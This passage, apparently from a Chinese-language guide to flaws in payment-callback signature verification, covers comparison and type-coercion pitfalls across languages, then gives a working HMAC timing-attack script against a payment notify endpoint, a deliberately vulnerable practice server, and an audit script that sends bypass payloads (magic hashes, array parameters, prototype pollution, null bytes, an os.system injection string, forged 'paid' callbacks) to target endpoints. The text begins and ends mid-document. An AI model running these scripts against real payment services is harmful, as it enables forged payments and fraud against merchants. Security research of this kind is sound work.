// 影响: 如果签名计算时用 key1, 验证时用 key2 (不同的实现)
// 两边读到的值不同 → 签名不匹配 → 但攻击者可以故意制造

// 更危险的: 如果有 side effect:
// JSON.parse('{"a":1,"a":2}') — 某些 parser 会调用两次 setter

// ===== 4. JSON 中的特殊数字 =====
console.log("\n=== JSON number edge cases ===");
console.log("JSON.parse('-0'):          ", JSON.parse("-0"));          // -0
console.log("Object.is(-0, 0):          ", Object.is(-0, 0));          // false!
console.log("JSON.parse('1e999'):       ", JSON.parse("1e999"));       // Infinity
console.log("JSON.parse('-1e999'):      ", JSON.parse("-1e999"));      // -Infinity
console.log("JSON.parse('{}'):          ", typeof JSON.parse("{}"));    // object
console.log("JSON.parse('[]'):          ", Array.isArray(JSON.parse("[]"))); // true

// -0 的诡异:
// if (amount === 0) → 但 amount 是 -0 → Object.is(-0, 0) → false
// 但 -0 == 0 → true, -0 === 0 → true
// 只有 Object.is(-0, 0) → false

// ===== 5. JSON.parse 的 reviver =====
// 如果签名验证用了 reviver:
// JSON.parse(text, (key, value) => {
//     if (key === 'amount') return parseInt(value);
//     return value;
// })
// → amount 被转为 int → 可能与其他部分的 string 比较不一致
```

## 4. Java 实现缺陷

### 4.1 String.equals() vs constant-time

```java
// JavaSignatureBugs.java — Java 签名比较缺陷

// ===== 1. String.equals() 不是 constant-time =====
public class SignatureBugs {

    // 漏洞: String.equals() 在找到第一个不同字符时返回
    public static boolean vulnCompare(String userSig, String correctSig) {
        return userSig.equals(correctSig);  // ← 时序泄露!
    }

    // 安全: MessageDigest.isEqual() 是 constant-time
    public static boolean safeCompare(String userSig, String correctSig) {
        return MessageDigest.isEqual(
            userSig.getBytes(StandardCharsets.UTF_8),
            correctSig.getBytes(StandardCharsets.UTF_8)
        );
    }

    // ===== 2. String.equalsIgnoreCase() =====
    // 如果签名比较用了 equalsIgnoreCase:
    // "ABC" == "abc" → true
    // 但 HMAC 是大写还是小写? 大小写不敏感 → 爆破空间减半!

    // ===== 3. == 比较 (引用) =====
    // if (userSig == correctSig) → 永远 false (不同对象)
    // 但如果是 String.intern():
    // if (userSig.intern() == correctSig.intern()) → 永远 true
    // (如果两个字符串值相同，intern 返回同一个引用)

    // ===== 4. Null 隐患 =====
    // correctSig.equals(userSig) → 如果 correctSig 为 null → NullPointerException
    // userSig.equals(correctSig) → 如果 userSig 为 null → NullPointerException
    // 如果异常被 catch 后返回 true → 绕过!
}
```

```python
# java_timing_demo.py — Java 签名时序演示
def java_timing_explanation():
    print("""
    // Java 签名比较时序攻击原理:

    // String.equals() 实现:
    // public boolean equals(Object anObject) {
    //     if (this == anObject) return true;        // 引用相同 → 瞬间返回
    //     if (anObject instanceof String) {
    //         String aString = (String)anObject;
    //         if (coder() == aString.coder()) {      // LATIN1 vs UTF16
    //             return isLatin1() ? StringLatin1.equals(value, aString.value)
    //                              : StringUTF16.equals(value, aString.value);
    //         }
    //     }
    //     return false;
    // }

    // StringLatin1.equals():
    // 逐个字节比较，遇到第一个不同字节返回 false
    // → 前 N 字节匹配时耗时更长 → 可做时序攻击

    // 安全替代:
    // MessageDigest.isEqual(byte[], byte[])
    // → 即使长度不同也恒定时间
    // (不计较早的 length check)

    // Java 11+:
    // Arrays.mismatch(byte[], byte[]) — 找到第一个不匹配的位置
    // → 也不是 constant-time!

    // Spring Security 的 PasswordEncoder:
    // 各种 encoder 的 matches() 方法→ 有些不是 constant-time

    // JDK 内 timing-safe 的路径:
    // - java.security.MessageDigest.isEqual()
    // - javax.crypto.Mac.doFinal() → 对比
    """)
```

### 4.2 Arrays.equals() 与 BigInteger 边角

```python
# java_array_biginteger.py — Java Arrays.equals 与 BigInteger 缺陷

def java_array_equals_issue():
    print("""
    // === Arrays.equals() 的时序问题 ===

    // java.util.Arrays.equals(byte[], byte[])
    // 也是短路比较: 发现不同立即返回
    // for (int i = 0; i < a.length; i++) {
    //     if (a[i] != b[i]) return false;   // ← timing leak
    // }
    // return true;

    // === 安全替代 ===
    // java.security.MessageDigest.isEqual(byte[], byte[])
    // → 恒定时间

    // === BigInteger 边角 ===

    // 场景: 将签名当作 BigInteger 比较

    // BigInteger("0").equals(BigInteger("0")) → true
    // BigInteger("0") == BigInteger.ZERO → 可能 true (缓存)
    // 但 BigInteger("0e123") → NumberFormatException!

    // BigInteger 比较的 trap:
    // new BigInteger("0001").equals(new BigInteger("1"))
    // → true (值相等)
    // 但如果签名需要精确字节匹配: "0001" ≠ "1"

    // BigInteger.signum():
    // 负数 BigInteger → signum() = -1
    // 如果签名 = -1 → 负值... 可能被当作错误处理

    // BigInteger.toString(16):
    // new BigInteger("00dead", 16).toString(16) → "dead" (前导零丢失!)
    // signature = "00dead" 但 toString() → "dead"
    // 签名长度不一致!

    // 修复: 手动补零
    // String.format("%064x", new BigInteger(1, sigBytes))
    """)
```

### 4.3 Null 处理不当

```python
# java_null_handling.py — Java Null 处理缺陷

def java_null_issues():
    print("""
    // === NullPointerException 导致的绕过 ===

    // 场景 1: 空值传到 equals()
    // if (userSig.equals(storedSig)) { verify(); }
    // → 如果 userSig == null → NullPointerException
    // → 如果 catch(Exception e) { return true; } → 绕过!

    // 场景 2: 自动拆箱
    // Boolean verified = null;
    // if (verified) { deliver(); }   ← NullPointerException!
    // → boolean b = verified; → NPE

    // 场景 3: Optional.get() 没有 isPresent 检查
    // String sig = optionalSig.get();  // 如果 absent → NoSuchElementException
    // → 异常 → 可能 fallback 到 allow

    // 场景 4: 签名在 map 中
    // Map<String, String> params = getPaymentParams();
    // String sign = params.get("sign");  // → null (key 不存在)
    // String calc = computeSign(params);
    // if (sign.equals(calc)) { ... }     // → NPE on sign (null)

    // 但是: if (calc.equals(sign)) { ... }
    // → 如果 sign 为 null → false (安全, 但可能触发其他逻辑)
    // → equals(null) → false (Java 规范: null 参数返回 false)

    // === 对比: == null 检查 ===
    // if (sign == null) { return false; }  ← 安全
    // if ("".equals(sign)) { ... }         ← 安全 (左边不会 null)
    // if (sign.equals("")) { ... }         ← 可能 NPE

    // === Spring 中的 Null 安全 ===
    // StringUtils.hasText(sign) → null/空字符串都安全
    // Objects.equals(a, b) → null 安全
    // Optional.ofNullable(sign).orElse("") → 默认值
    """)
```

## 5. 跨语言通用缺陷

### 5.1 Early Return on Comparison (Timing)

```python
# universal_timing.py — 跨语言时序泄漏

EARLY_RETURN_LANGUAGES = {
    "PHP":    "strcmp() 逐个字节比较，首个差异返回",
    "Python": "== 比较逐个元素，首个差异返回",
    "Java":   "String.equals() 逐个 char 比较",
    "JS":     "=== 字符串比较在 V8 中差异明显",
    "Go":     "subtle.ConstantTimeCompare vs ==/bytes.Equal",
    "Ruby":   "== 在 String 中是逐个字符比较",
    "Rust":   "== 对 String 是 lexicographic 比较",
    "C#":     "String.Equals() 是 ordinal 比较",
}

def timing_attack_intro():
    """时序攻击基础"""
    print("""
    // 时序攻击原理:
    // 所有非恒定时间的字符串比较都会泄漏"前多少字节正确"
    // 恢复一个 32 字节 HMAC 签名: 32 × 256 = 8192 次探测
    // 每次探测: 发请求 → 测量响应时间 → 取最长的那个
    
    // 需要:
    // - 网络 RTT 稳定 (< 5ms 抖动)
    // - 大样本量 (每个候选字节约 100-1000 次)
    // - 统计分析 (去掉异常值)
    // - 本地或近端网络
    """)
```

### 5.2 Exception-Based Bypass

```python
# universal_exception_bypass.py — 异常绕过签名验证

def exception_bypass_classes():
    """各语言中异常导致签名验证被跳过的模式"""
    print("""
    // 通用模式:
    try {
        if (verifySignature(request)) {
            processPayment(request);
        }
    } catch (Exception e) {
        // ← 异常时没有任何操作，payment 不处理 (还好)
        // 但下面这种就危险了:
    }

    // ===== 危险模式 1: catch 里默认 allow =====
    try {
        if (!verifySignature(request)) {
            return "invalid";
        }
    } catch (Exception e) {
        // do nothing  ← 执行流继续!
    }
    processPayment(request);  ← 签名验证被异常跳过

    // ===== 危险模式 2: 异常不阻止流程 =====
    try {
        verifySignature(request);
    } catch (Exception e) {
        logger.error("Verification failed", e);  // 只记日志!
    }
    deliverGoods();  ← 发货逻辑在 try/catch 外面

    // ===== 危险模式 3: 宽松的 catch =====
    try {
        ...
    } catch (Exception | Error e) {
        // 连 OutOfMemoryError 都 catch
        return true;  // 出错默认通过
    }

    // ===== 触发异常的手段 =====
    EXCEPTION_TRIGGERS = {
        "ArrayIndexOutOfBounds": "传空数组/过短数组",
        "NullPointer":           "传 null 值",
        "NumberFormat":          "传非数字到 parseInt()",
        "ClassCast":             "传不兼容类型",
        "StackOverflow":         "深度嵌套 JSON",
        "OutOfMemory":           "超大 payload → OOM → 默认 allow?",
        "IllegalArgument":       "传无效参数",
        "EOFException":          "截断请求体",
        "SocketTimeout":         "慢请求 → 超时 → 默认处理",
    }
    """)
```

### 5.3 Boolean Coercion (Truthy/Falsy)

```python
# universal_truthy.py — Truthy/falsy 绕过

TRUTHY_FALSY_BY_LANGUAGE = {
    "PHP": """
        // Falsy: false, null, 0, 0.0, "", "0", [], empty
        // Truthy: true, "false" (字符串!), 1, [1], stdClass
        
        // 绕过: if ($verified) { ... }
        // $verified = "yes" → true (非空字符串)
        // $verified = 1 → true
        // $verified = new stdClass() → true
    """,
    "Python": """
        # Falsy: False, None, 0, 0.0, "", [], (), {}, set()
        # Truthy: True, 1, "False" (字符串!), [False], {"a": 0}
        
        # 绕过: if verified:
        # verified = "False" → True! ("False" 是非空字符串)
        # verified = [0] → True! (非空列表)
        # verified = {"valid": False} → True! (非空字典)
    """,
    "JavaScript": """
        // Falsy: false, null, undefined, 0, NaN, ""
        // Truthy: true, 1, "false" (字符串!), [], {}, "0"
        
        // 绕过: if (verified) { ... }
        // verified = "false" → true! (非空字符串)
        // verified = [] → true! (非空数组)
        // verified = {} → true! (非空对象)
        
        // 特别注意: "0" == false → true 但 if("0") → true
        // "0" 是 truthy 但 == false!
    """,
    "Java": """
        // Java 没有隐式 truthy/falsy
        // 但 Boolean 可以拆箱:
        // Boolean verified = null;
        // if (verified) { ... }  ← NullPointerException!
        // Boolean verified = Boolean.valueOf("trueish");
        // → verified = false (只有 "true" 不区分大小写才是 true)
        
        // Boolean.parseBoolean("yes") → false
        // Boolean.parseBoolean("1") → false
        // 只有 "true" 返回 true
    """,
    "Ruby": """
        # Falsy: false, nil
        # Truthy: true, 0, "", [], {} (只有 false 和 nil 是 falsy!)
        
        # 绕过: if verified
        # verified = 0 → true! (0 是 truthy)
        # verified = "" → true! (空字符串是 truthy)
        # verified = [] → true! (空数组是 truthy)
    """,
    "Go": """
        // Go 没有隐式 bool 转换
        // if verified { ... }  // 编译错误: verified 必须是 bool
        // 但允许: if verified != nil { ... }
        // 和: if len(verified) > 0 { ... }
    """,
}
```

### 5.4 Truncation (只检查前 N 字节)

```python
# universal_truncation.py — 签名截断绕过

def truncation_scenarios():
    """各种截断绕过场景"""
    print("""
    // ===== 截断模式 1: 只比较前 N 字节 =====
    // 代码: if (memcmp(sig1, sig2, 4) == 0)  // 只比较前 4 字节!
    // 攻击: 任何前 4 字节匹配的签名都通过
    // 碰撞难度: 2^32  → 可枚举

    // ===== 截断模式 2: substr 截断 =====
    // PHP: if (substr($user_sig, 0, 8) == substr($correct, 0, 8))
    // 攻击: 只需要 8 字节 (4 字节 hex) 碰撞
    // 2^32 次尝试 → 很低的碰撞概率, 但:
    // 如果有 100 个签名样本 → 生日攻击 → 更可行

    // ===== 截断模式 3: 只检查非空 =====
    // if (strlen($user_sig) > 0 && $user_sig !== $stored) → 任意非空签名?
    // 不对, 这个实际上是安全反模式

    // ===== 截断模式 4: 数据库 truncation =====
    // 数据库字段 VARCHAR(32), 但签名是 40 字节 SHA1
    // INSERT → 自动截断到 32 字节
    // 验证时: 用户输入 32 字节, 数据库存的是截断后的 32 字节
    // → 完全不同的签名可能"匹配"
    
    // ===== 截断模式 5: 整数截断 =====
    // HMAC 输出是 256 bit → byte[32]
    // 但数据库存的是 INT → 前 4 字节作为 int 比较
    // 碰撞概率: 1/2^32 (生日攻击: 2^16 个签名就够了)
    """)
```

### 5.5 Charset/Encoding 差异

```python
# universal_charset.py — 字符编码差异绕过

def charset_attack_scenarios():
    """字符编码导致的签名绕过"""
    print("""
    // ===== 场景 1: UTF-8 vs Latin-1 =====
    // 一个字符串在不同编码下产生不同的字节序列
    // "café" in UTF-8: 63 61 66 c3 a9 (5 字节)
    // "café" in Latin-1: 63 61 66 e9 (4 字节)
    // → 签名结果完全不同!

    // ===== 场景 2: Unicode 归一化 =====
    // "é" 有两种 Unicode 表示:
    //   U+00E9 (precomposed)
    //   U+0065 U+0301 (decomposed: e + combining accent)
    // → 视觉相同, 字节不同 → 签名不同

    // 常见归一化形式:
    // NFC  — 优先使用组合字符 (é → U+00E9)
    // NFD  — 优先使用分解字符 (é → e + combining accent)
    // NFKC — 兼容组合 (ﬀ → ff)
    // NFKD — 兼容分解

    // 利用: 如果服务端用 NFC, 攻击者用 NFD → 签名不匹配
    // 但如果服务端不做归一化: 两个同样的"é" 签名不同!

    // ===== 场景 3: UTF-8 BOM =====
    // UTF-8 with BOM: EF BB BF 开头
    // UTF-8 without BOM: 无 BOM
    // 如果签名时没去掉 BOM, 但验证时去掉了 → 签名不匹配
    // 反过来: 攻击者在 payload 开头加 BOM → 签名变化

    // ===== 场景 4: UTF-16 vs UTF-8 =====
    // "hello" 在 UTF-8:  68 65 6c 6c 6f (5 字节)
    // "hello" 在 UTF-16: ff fe 68 00 65 00 6c 00 6c 00 6f 00 (12 字节)
    // HMAC over UTF-8 ≠ HMAC over UTF-16

    // ===== 场景 5: 大小写归一化 =====
    // 某些签名比较前做 toLowerCase():
    // "ABCDEF" → "abcdef"
    // 但某些字符在不同 locale 下大小写不同:
    // "İ" (Turkish capital I with dot) → toLowerCase() → "i" (Turkish)
    // "I" → toLowerCase() → "i" (English)
    // 利用: 构造包含特殊大小写的字符串 → 绕过

    // ===== 场景 6: 空白字符 =====
    // 签名前是否 trim()?
    // 服务端: trim("abc123") → "abc123"
    // 攻击者: "abc123" → 通过
    // 攻击者: " abc123" → 服务器 trim 后再签名 → 通过
    // 但是: " abc123 " 和 "abc123" 的签名不同!
    """)

    NORMALIZATION_BYPASSES = [
        ("NFC", "é"),              # é (precomposed)
        ("NFD", "é"),        # e + combining accent
        ("NFKC", "ﬀ"),             # ﬀ (ligature)
        ("NFKD", "ff"),                 # ff (decomposed)
    ]
    for form, char in NORMALIZATION_BYPASSES:
        print(f"  {form}: {repr(char)} → bytes: {char.encode('utf-8').hex()}")
```

### 5.6 Null Byte Truncation

```python
# universal_null_byte.py — Null 字节截断绕过

def null_byte_truncation():
    """Null 字节截断导致的签名绕过"""
    print("""
    // ===== Null 字节在各种语言中的行为 =====

    // C/C++: 字符串以 \\x00 结尾
    // strcmp("abc\\x00def", "abc") → 0 (相等! \\x00 认为是结束)
    // 但 HMAC("abc\\x00def") ≠ HMAC("abc")

    // PHP: 字符串可以包含 \\x00
    // strcmp("abc\\x00def", "abc") → 1 (不相等! PHP 允许二进制字符串)
    // 但有些 C 扩展会截断

    // Java: String 可以有 \\x00
    // "abc\\x00def".equals("abc") → false
    // 但写入文件或数据库时可能截断

    // Python: 明确区别
    // b"abc\\x00def"  ≠ b"abc"
    // str("abc\\x00def") ≠ str("abc")

    // JavaScript: 可以包含 \\x00
    // "\\x00" === "" → false
    // 但 JSON 序列化时可能不同

    // ===== 实际利用 =====
    // 场景: 签名输入直接传给底层 C 库
    // HMAC("abc\\x00" + data, key) → C 库认为 key 在 \\x00 结束
    // → 实际使用的 key 更短 → 可枚举

    // 场景: 文件路径截断
    // PHP: file_get_contents("/etc/passwd\\x00.jpg") → /etc/passwd (PHP < 5.3)
    // 如果签名参数包含路径 → 路径截断 → 读任意文件

    // ===== 防御 =====
    // 始终在签名计算前 sanitize 输入
    // 移除或转义 null 字节
    // 使用固定编码 (如 hex 或 base64) 而非原始字节
    """)
```

## 6. 时间盲注签名恢复

### 6.1 完整时序攻击脚本

```python
# timing_attack_hmac.py — HMAC 签名字节级时序盲注恢复

"""
完整的时序攻击: 在网络抖动中恢复 HMAC 签名

原理:
1. 对每个字节位置, 尝试所有 256 个可能值
2. 正确的字节导致服务端继续比较下一个字节 → 耗时略长
3. 使用大量样本 + 统计分析消除噪声
4. 最终恢复完整签名 → 伪造任意请求

前置条件:
- 本地或近端网络 (RTT < 5ms)
- 目标使用非恒定时间的字符串比较
- 有已知接口可以发送自定义签名
"""

import requests
import time
import statistics
import itertools
from typing import Optional

class TimingAttack:
    """HMAC 签名时序恢复攻击器"""

    def __init__(self, base_url: str, params_template: dict,
                 sign_field: str = "sign",
                 sig_length: int = 32,
                 samples_per_byte: int = 100,
                 timeout: float = 5.0):
        """
        Args:
            base_url: 目标 URL
            params_template: 除签名外的请求参数
            sign_field: 签名字段名
            sig_length: 签名长度 (字节)
            samples_per_byte: 每个候选字的采样次数
            timeout: HTTP 超时
        """
        self.base_url = base_url
        self.params = params_template
        self.sign_field = sign_field
        self.sig_length = sig_length
        self.samples = samples_per_byte
        self.timeout = timeout
        self.session = requests.Session()

    def measure(self, hex_sig: str, n: int = 1) -> list[float]:
        """测量 n 次请求的响应时间"""
        times = []
        params = {**self.params, self.sign_field: hex_sig}
        for _ in range(n):
            try:
                start = time.perf_counter()
                r = self.session.post(
                    self.base_url,
                    json=params,
                    timeout=self.timeout
                )
                elapsed = time.perf_counter() - start
                times.append(elapsed)
            except Exception:
                times.append(None)
        return [t for t in times if t is not None]

    def median_time(self, hex_sig: str) -> float:
        """多次测量的中位数时间 (抗异常值)"""
        times = self.measure(hex_sig, self.samples)
        if len(times) < 3:
            return float('inf')
        return statistics.median(times)

    def recover_byte(self, known_prefix: str, position: int,
                     hex_chars: str = "0123456789abcdef") -> tuple[str, float]:
        """恢复一个 nibble (半字节)

        Args:
            known_prefix: 已恢复的 hex 前缀
            position: 当前 nibble 位置 (0-based)
            hex_chars: 候选 hex 字符

        Returns:
            (最佳 hex 字符, 置信度分数)
        """
        timings = []
        for c in hex_chars:
            test_sig = known_prefix + c + "0" * (self.sig_length * 2 - len(known_prefix) - 1)
            t = self.median_time(test_sig)
            timings.append((c, t))

        # 按时间降序排列 (最长的最有可能是正确字符)
        timings.sort(key=lambda x: x[1], reverse=True)

        best_char = timings[0][0]
        best_time = timings[0][1]
        second_time = timings[1][1]
        confidence = best_time - second_time

        return best_char, confidence

    def recover_full_signature(self, verbose: bool = True) -> str:
        """恢复完整签名

        Returns:
            完整 hex 签名 (小写)
        """
        recovered = ""

        for pos in range(self.sig_length * 2):
            best_char, confidence = self.recover_byte(recovered, pos)

            if verbose:
                progress = "#" * len(recovered) + "." * (self.sig_length * 2 - len(recovered))
                print(f"[{pos:3d}/{self.sig_length*2}] best='{best_char}' "
                      f"(conf={confidence:.6f}s) | {progress}")

            recovered += best_char

            # 每 8 个 nibble (4 字节) 做一次验证
            if len(recovered) % 8 == 0 and len(recovered) < self.sig_length * 2:
                # 用 recovered 做一次实际请求
                params = {**self.params, self.sign_field: recovered}
                r = self.session.post(self.base_url, json=params, timeout=self.timeout)
                if r.status_code == 200 and "invalid" not in r.text.lower():
                    if verbose:
                        print(f"  [*] Partial verification success at {len(recovered)//2} bytes!")
                    # 可能已经够了? 存储状态
                    continue

        return recovered

    def verify_signature(self, hex_sig: str) -> bool:
        """验证恢复的签名是否有效"""
        params = {**self.params, self.sign_field: hex_sig}
        r = self.session.post(self.base_url, json=params, timeout=self.timeout)
        return r.status_code == 200 and "invalid" not in r.text.lower()


# ===== 使用示例 =====
def demo_timing_attack():
    attack = TimingAttack(
        base_url="https://target/api/payment/notify",
        params_template={
            "order_id": "TEST_ORDER",
            "amount": "100.00",
            "currency": "USD",
            "timestamp": "2024-01-01T00:00:00Z",
        },
        sign_field="sign",
        sig_length=32,         # 32 字节 = 64 hex chars (SHA256)
        samples_per_byte=50,   # 每个候选 50 次
    )

    print("[*] Starting timing attack...")
    print(f"[*] Total requests: ~{attack.sig_length * 2 * 16 * attack.samples}")
    print(f"    = {attack.sig_length * 2 * 16 * attack.samples} HTTP requests")

    recovered = attack.recover_full_signature(verbose=True)
    print(f"\n[*] Recovered signature: {recovered}")

    if attack.verify_signature(recovered):
        print("[!] SIGNATURE VERIFIED — full bypass!")
    else:
        print("[*] Signature not accepted — check length/encoding")


# ===== 统计优化: 中位数 vs 均值 =====
def compare_median_vs_mean():
    """展示中位数比均值更适合时序攻击"""
    import random

    # 模拟 100 次测量, 包含一些异常值
    times_correct = [0.012] * 80 + [0.100] * 20  # 80% 正常, 20% 网络延迟
    times_wrong   = [0.008] * 80 + [0.100] * 20

    print(f"Correct byte: mean={statistics.mean(times_correct):.4f}s "
          f"median={statistics.median(times_correct):.4f}s")
    print(f"Wrong byte:   mean={statistics.mean(times_wrong):.4f}s "
          f"median={statistics.median(times_wrong):.4f}s")
    print(f"Mean diff:    {statistics.mean(times_correct) - statistics.mean(times_wrong):.6f}s")
    print(f"Median diff:  {statistics.median(times_correct) - statistics.median(times_wrong):.6f}s")

    # 有网络抖动时, 中位数更稳定
    # 中位数剔除了上层的 50% 噪声


# ===== 高级: Jitter 消除 =====
class JitterRemoval:
    """网络抖动消除技术"""

    @staticmethod
    def remove_outliers(times: list[float], m: float = 2.0) -> list[float]:
        """去除超过 m 倍标准差的值"""
        if len(times) < 4:
            return times
        mean = statistics.mean(times)
        std = statistics.stdev(times)
        return [t for t in times if abs(t - mean) < m * std]

    @staticmethod
    def relative_timing(reference_sig: str, test_sig: str,
                        measure_fn, n: int = 100) -> float:
        """相对时序: 测量与参考签名的相对差异"""
        ref_times = measure_fn(reference_sig, n)
        test_times = measure_fn(test_sig, n)
        ref_median = statistics.median(ref_times)
        test_median = statistics.median(test_times)
        return test_median - ref_median

    @staticmethod
    def progressive_zscore(accumulated_times: list) -> dict:
        """累积 Z-score: 逐步缩小候选集"""
        # 对每个候选字, 维护一个时间列表
        # 每轮采样后计算 Z-score, 剔除 > 2 的异常值
        # 当某个候选字的 Z-score 显著高于其他时, 确定该字节
        pass


if __name__ == "__main__":
    compare_median_vs_mean()
```

### 6.2 本地测试: 可攻击的服务端

```python
# timing_vulnerable_server.py — 带时序漏洞的签名验证服务 (用于练习)
import hmac, hashlib, time
from flask import Flask, request, jsonify

app = Flask(__name__)
SECRET = b"test_secret_key_12345"

def vulnerable_verify(user_sig, correct_sig):
    """有时序漏洞的比较"""
    if len(user_sig) != len(correct_sig):
        return False
    for a, b in zip(user_sig, correct_sig):
        if a != b:
            return False
        time.sleep(0.0001)  # 模拟比较开销 + 放大时序差异
    return True

def safe_verify(user_sig, correct_sig):
    """恒定时间比较"""
    return hmac.compare_digest(user_sig, correct_sig)

@app.route("/verify", methods=["POST"])
def verify():
    data = request.get_json()
    user_sig = data.get("sign", "")

    # 计算期望签名
    message = f"{data.get('order_id')}:{data.get('amount')}".encode()
    correct_sig = hmac.new(SECRET, message, hashlib.sha256).hexdigest()

    # 使用有漏洞的比较
    if vulnerable_verify(user_sig, correct_sig):
        return jsonify({"status": "verified", "action": "deliver"})
    else:
        return jsonify({"status": "invalid"}), 403

# 启动: python timing_vulnerable_server.py
# 攻击: 针对 localhost:5000/verify 跑 timing_attack_hmac.py
```

## 7. 完整审计脚本

```python
# implementation_audit.py — 签名实现缺陷完整审计
import requests, time, hmac, hashlib, json, statistics

TARGET = "https://target"
S = requests.Session()


class SignatureImplAuditor:
    """签名实现缺陷审计"""

    def __init__(self, base_url: str):
        self.base = base_url.rstrip("/")
        self.findings = []

    def audit_all(self):
        """执行所有检��"""

        # PHP 专项
        self.check_strcmp_array()
        self.check_md5_sha1_array()
        self.check_magic_hash()
        self.check_zero_equality()
        self.check_in_array_juggle()
        self.check_extract_overwrite()

        # Python 专项
        self.check_python_hook()
        self.check_python_type_coercion()

        # JS/Node 专项
        self.check_js_type_coercion()

        # Java 专项
        self.check_java_common()

        # 跨语言通用
        self.check_exception_bypass()
        self.check_truncation()
        self.check_timing()

        return self.findings

    def add(self, category: str, detail: str, evidence: dict = None):
        self.findings.append({
            "category": category,
            "detail": detail,
            "evidence": evidence or {},
        })
        print(f"[{category:20s}] {detail}")

    # ==================== PHP ====================

    def check_strcmp_array(self):
        """PHP strcmp 数组绕过"""
        for path in ["/notify", "/callback", "/api/verify"]:
            for field in ["sign", "signature", "token"]:
                r = S.post(self.base + path,
                    data={f"{field}[]": "x", "order_id": "TEST"},
                    timeout=10)
                if r.status_code == 200:
                    self.add("PHP-strcmp",
                        f"strcmp array bypass at {path} via {field}[]")
                    return

    def check_md5_sha1_array(self):
        """PHP md5/sha1 数组绕过"""
        for path in ["/notify", "/callback", "/verify"]:
            # md5/sha1 双数组绕过
            r = S.post(self.base + path,
                data="a[]=1&b[]=2",
                headers={"Content-Type": "application/x-www-form-urlencoded"},
                timeout=10)
            if r.status_code == 200:
                self.add("PHP-hash-array",
                    f"md5/sha1 dual array bypass at {path}")

    def check_magic_hash(self):
        """PHP magic hash 绕过"""
        MAGIC = "0e462097431907509062922748828256"
        for path in ["/notify", "/callback", "/webhook"]:
            for field in ["sign", "signature", "hash"]:
                r = S.post(self.base + path, json={
                    "order_id": "TEST", "status": "paid",
                    field: MAGIC,
                }, timeout=10)
                if r.status_code == 200 and "invalid" not in r.text.lower():
                    self.add("PHP-magic-hash",
                        f"Magic hash bypass at {path} via {field}")

    def check_zero_equality(self):
        """PHP 0 == "any_string" 绕过"""
        for path in ["/notify", "/return", "/callback"]:
            # 金额传字符串
            r = S.post(self.base + path, json={
                "order_id": "TEST", "amount": "abc",
                "status": "paid"
            }, timeout=10)
            if r.status_code == 200:
                self.add("PHP-zero-equality",
                    f"0 == string bypass at {path} (amount=abc)")

            # 状态传 0
            r = S.post(self.base + path, json={
                "order_id": "TEST", "amount": 100,
                "status": 0
            }, timeout=10)
            if r.status_code == 200 and "invalid" not in r.text.lower():
                self.add("PHP-zero-equality",
                    f"status=0 bypass at {path}")

    def check_in_array_juggle(self):
        """PHP in_array() 类型混淆"""
        # in_array(0, ['admin']) → true
        for path in ["/api/user/role", "/api/admin/check"]:
            r = S.post(self.base + path, json={"role": 0}, timeout=10)
            if r.status_code == 200:
                self.add("PHP-inarray",
                    f"in_array(0, ...) bypass at {path}")

    def check_extract_overwrite(self):
        """PHP extract/parse_str 变量覆盖"""
        OVERWRITES = [
            {"trade_status": "TRADE_SUCCESS"},
            {"status": "paid"},
            {"admin": True, "verified": True},
        ]
        for path in ["/notify", "/callback"]:
            for data in OVERWRITES:
                r = S.post(self.base + path, data=data, timeout=10)
                if r.status_code == 200:
                    self.add("PHP-extract",
                        f"extract overwrite at {path} with {data}")
                    return

    # ==================== Python ====================

    def check_python_hook(self):
        """Python 签名 hook 绕过"""
        # 测试是否可以用 __import__ 绕过 (dangerous)
        payloads = [
            {"data": "__import__('os').system('id')", "sign": "x"},
            {"data": None, "sign": "x"},
            {"data": float('nan'), "sign": "x"},
        ]
        for path in ["/notify", "/api/verify", "/api/callback"]:
            for data in payloads:
                try:
                    r = S.post(self.base + path, json=data, timeout=10)
                    if r.status_code == 200:
                        self.add("Python-exception",
                            f"Exception bypass at {path} with {data}")
                except:
                    pass

    def check_python_type_coercion(self):
        """Python 类型强制绕过"""
        # Decimal vs float 不匹配导致异常
        pass  # 需具体触发方式

    # ==================== JavaScript ====================

    def check_js_type_coercion(self):
        """JavaScript 类型强制绕过"""
        # '__proto__' pollution
        r = S.post(self.base + "/notify", json={
            "__proto__": {"admin": True},
            "sign": "x", "order_id": "TEST",
        }, timeout=10)
        if r.status_code == 200:
            self.add("JS-proto-pollution",
                "__proto__ pollution via notify")

        # Array coercion
        r = S.post(self.base + "/notify", json={
            "sign": ["fake"],
            "order_id": "TEST",
        }, timeout=10)
        if r.status_code == 200:
            self.add("JS-array-coercion",
                "Array to string coercion bypass")

    # ==================== Java ====================

    def check_java_common(self):
        """Java 常见缺陷"""
        # NullPointerException 绕过
        for path in ["/notify", "/api/verify"]:
            r = S.post(self.base + path, json={
                "sign": None,
                "order_id": "TEST",
            }, timeout=10)
            if r.status_code == 200:
                self.add("Java-null",
                    f"Null sign bypass at {path}")

            # Missing field
            r = S.post(self.base + path, json={
                "order_id": "TEST",
                # 没有 sign 字段!
            }, timeout=10)
            if r.status_code == 200:
                self.add("Java-null",
                    f"Missing sign field bypass at {path}")

    # ==================== 跨语言通用 ====================

    def check_exception_bypass(self):
        """异常导致签名跳过"""
        TRIGGER_PAYLOADS = [
            # 超大 payload
            {"data": "x" * 1000000, "sign": "test"},
            # 深度嵌套
            {"data": {"a": {"b": {"c": {"d": {}}}}}, "sign": "test"},
            # 类型错误
            {"data": object(), "sign": "test"},
            # 递归
            [],  # 空列表
            # 非 JSON
        ]
        for path in ["/notify", "/callback", "/api/verify"]:
            for payload in TRIGGER_PAYLOADS[:2]:  # 前两个
                try:
                    r = S.post(self.base + path, json=payload, timeout=30)
                    if r.status_code == 200:
                        self.add("Exception-bypass",
                            f"Exception trigger at {path}: {str(payload)[:50]}")
                except:
                    pass

            # Null byte
            r = S.post(self.base + path, json={
                "sign": "abc\x00def",
                "order_id": "TEST\x00",
            }, timeout=10)
            if r.status_code == 200:
                self.add("Exception-bypass",
                    f"Null byte bypass at {path}")

    def check_truncation(self):
        """截断绕过"""
        # 只发部分签名
        for path in ["/notify", "/callback"]:
            r = S.post(self.base + path, json={
                "order_id": "TEST",
                "sign": "00",           # 只有 1 字节
                "status": "paid",
            }, timeout=10)
            if r.status_code == 200:
                self.add("Truncation",
                    f"Short sign (1 byte) accepted at {path}")

            # 空签名
            r = S.post(self.base + path, json={
                "order_id": "TEST",
                "sign": "",
                "status": "paid",
            }, timeout=10)
            if r.status_code == 200:
                self.add("Truncation",
                    f"Empty sign accepted at {path}")

    def check_timing(self):
        """时序泄露检测 (基础版)"""
